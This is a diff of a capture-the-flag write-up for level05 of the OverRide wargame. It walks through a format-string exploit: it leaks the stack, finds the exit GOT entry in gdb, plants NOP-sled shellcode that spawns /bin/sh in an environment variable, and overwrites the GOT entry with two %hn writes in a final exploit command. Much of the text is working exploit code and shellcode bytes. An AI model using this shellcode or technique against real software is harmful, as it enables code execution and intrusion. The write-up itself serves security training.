@@ -1,12 +1,50 @@
+The code is very small and its obviously a printf exploit because it doesnt have args.
+Let use this to print the stack:
 
-0x80497e0 exit 
+level05@OverRide:~$ python -c "print('AAAA' + '%p.' * 100)" | ./level05 
+aaaa0x64.0xf7fcfac0.0xf7ec3add.0xffffd6ef.0xffffd6ee.(nil).0xffffffff.0xffffd774.0xf7fdb000.0x61616161.0x252e7025.
+0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.
+0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
 
-0xffffd86c nop of shellcode
+Our A (41) appear as a (61) because of this part of the code:
 
-0xd86c -> 55396
+  for ( i = 0; i < strlen(s); ++i )
+  {
+    if ( s[i] > 64 && s[i] <= 90 )
+      s[i] ^= 0x20u;
+  }
+
+We can see that our input is 10 byte away from the start of the stack, this will be useful.
+
+What we want to do is put the adresss of exit instead, and use %d and %n to replace the adress with the adress of our shellcode.
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0x08048370  exit
+0x08048370  exit@plt
+(gdb) x/i 0x08048370
+   0x8048370 <exit@plt>:	jmp    *0x80497e0
+(gdb) 
+
+the address of exit is: 0x80497e0
+
+Now we need to create our shellcode and find the address of it:
+env -i SHELLCODE=$(python -c "print('\x90' * 500 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") gdb ./level05
+
+x/500x environ
+0xffffddcc:	0x90909090	0x90909090	0x90909090	0x90909090
+
+0xffffddcc we will use this nop of shellcode
+
+But 0xffffddcc = 4294958812, this is too big to store in a int !
+
+We will need to split it and write it in 2 times.
+
+0xddcc -> 56772 (56780 - 8 for the 2 first address)
 0xffff -> 65535
-65535 - 55396 = 10131
+65535 - 56772 = 8755
 
-
-level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55396d%10$hn" + "%10131d%11$hn")' > /tmp/txt
+Here is the final exploit:
+level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56772d%10$hn" + "%8755d%11$hn")' > /tmp/txt
 level05@OverRide:~$ cat /tmp/txt - | ./level05 
